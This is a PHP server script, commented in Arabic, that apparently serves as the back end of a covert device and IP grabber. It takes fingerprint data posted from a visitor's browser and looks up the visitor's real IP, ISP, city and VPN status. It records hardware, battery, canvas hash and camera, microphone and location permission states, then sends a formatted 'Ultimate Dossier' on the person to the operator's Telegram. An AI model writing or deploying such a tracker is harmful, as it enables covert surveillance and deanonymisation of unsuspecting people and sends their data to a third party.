<?php
require_once 'config.php';
require_once 'telegram.php';

$json = file_get_contents('php://input');
$d = json_decode($json, true);

if ($d) {
    // 1. استخراج الـ IP الحقيقي
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ip = explode(',', $ip)[0];
    
    // 2. استخبارات الشبكة (OSINT via IP-API)
    // Timeout قصير جداً (ثانيتين) عشان السيرفر ميعلقش لو الـ API بطيء
    $ctx = stream_context_create(['http' => ['timeout' => 2]]);
    $ipInfo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,as,hosting", false, $ctx), true);
    
    $isp = "مجهول"; $city = "مجهول"; $asn = "مجهول"; $isHosting = "لا 🟢";
    if ($ipInfo && $ipInfo['status'] === 'success') {
        $isp = $ipInfo['isp'];
        $city = $ipInfo['city'] . ", " . $ipInfo['country'];
        $asn = $ipInfo['as'];
        $isHosting = $ipInfo['hosting'] ? 'نعم (VPN/Server) 🔴' : 'لا (Residential) 🟢';
    }

    // 3. تحليل وتجهيز البيانات
    $storageGB = $d['storageTotal'] > 0 ? round($d['storageTotal'] / (1024**3), 1) : 0;
    
    // التحليل الجنائي للموديل المخفي (مثل متصفح تليجرام)
    $modelDisplay = $d['model'];
    if ($modelDisplay == 'Hidden') {
        $gpu = $d['gpu']['renderer'];
        if (strpos($gpu, 'Adreno (TM) 740') !== false) {
            $modelDisplay = "Hidden (✅ استنتاج: S23/S24 Ultra)";
        } elseif (strpos($gpu, 'Adreno (TM) 730') !== false) {
            $modelDisplay = "Hidden (✅ استنتاج: S22 Ultra / Snap 8 Gen 1)";
        } elseif (strpos($gpu, 'Apple') !== false) {
            $modelDisplay = "Hidden (✅ استنتاج: iOS/iPhone)";
        }
    }

    // 4. بناء التقرير الشامل
    $msg = "⚡ <b>System-X: Ultimate Dossier</b>\n";
    $msg .= "━━━━━━━━━━━━━━\n";

    $msg .= "🌍 <b>استخبارات الشبكة (OSINT):</b>\n";
    $msg .= "• الـ IP الحقيقي: <code>$ip</code>\n";
    $msg .= "• الموقع التقريبي: <code>$city</code>\n";
    $msg .= "• مزود الخدمة: <code>$isp</code>\n";
    $msg .= "• رقم الشبكة (ASN): <code>$asn</code>\n";
    $msg .= "• بروكسي / سيرفر: <b>$isHosting</b>\n\n";

    $msg .= "🆔 <b>الهوية والنظام:</b>\n";
    $msg .= "• الموديل: <code>$modelDisplay</code>\n";
    $msg .= "• إصدار النظام: <code>{$d['osVer']}</code>\n";
    $msg .= "• التوقيت: <code>{$d['timezone']}</code>\n";
    $msg .= "• السرعة: <code>{$d['net']['speed']} Mbps</code> | Ping: <code>{$d['net']['ping']}ms</code>\n\n";

    $msg .= "🖥️ <b>الشاشة الدقيقة:</b>\n";
    $msg .= "• فيزيائية: <code>{$d['physW']} x {$d['physH']}</code> | منطقية: <code>{$d['screenW']} x {$d['screenH']}</code>\n";
    $msg .= "• DPR: <code>{$d['dpr']}</code> | ألوان: <code>{$d['colorDepth']}-bit</code>\n\n";

    $msg .= "⚙️ <b>العتاد والمواصفات:</b>\n";
    $msg .= "• كارت الشاشة (GPU): <code>{$d['gpu']['renderer']}</code>\n";
    $msg .= "• المعالج: <code>{$d['hardware']['cores']} Cores</code> | الرام: <code>{$d['hardware']['ram']} GB</code>\n";
    $msg .= "• التخزين: <code>$storageGB GB</code>\n";
    $msg .= "• البطارية: <code>{$d['bat']['level']}%</code> " . ($d['bat']['charging'] ? '⚡' : '🔋') . "\n\n";

    $msg .= "🕵️ <b>البصمات والأذونات المخفية:</b>\n";
    $msg .= "• المظهر (Theme): <code>{$d['darkMode']}</code>\n";
    $msg .= "• الأذونات [ كاميرا: <code>{$d['perms']['cam']}</code> | مايك: <code>{$d['perms']['mic']}</code> | موقع: <code>{$d['perms']['loc']}</code> ]\n";
    $msg .= "• الوسائط [ مايك: <code>{$d['media']['audioIn']}</code> | كاميرا: <code>{$d['media']['videoIn']}</code> ]\n";
    $msg .= "• دقة المحرك (Math): <code>{$d['math']}</code>\n";
    $msg .= "• خطوط النظام: <code>{$d['fonts']} / 9</code> المطابقة\n\n";

    $msg .= "🛡️ <b>الفحص الأمني (Anti-Bot):</b>\n";
    $msg .= "• الـ Webdriver: <code>" . ($d['webdriver'] ? 'مفعل 🔴' : 'نظيف 🟢') . "</code>\n";
    $msg .= "• بصمة الكانفاس:\n<code>{$d['canvasHash']}</code>\n";
    $msg .= "• الـ UserAgent:\n<code>{$d['ua']}</code>\n\n";

    $msg .= "—\n";
    $msg .= "👨‍💻 <a href='https://t.me/" . DEV_USERNAME . "'>" . DEV_USERNAME . "</a>";

    sendTelegramMessage($msg);
}
?>
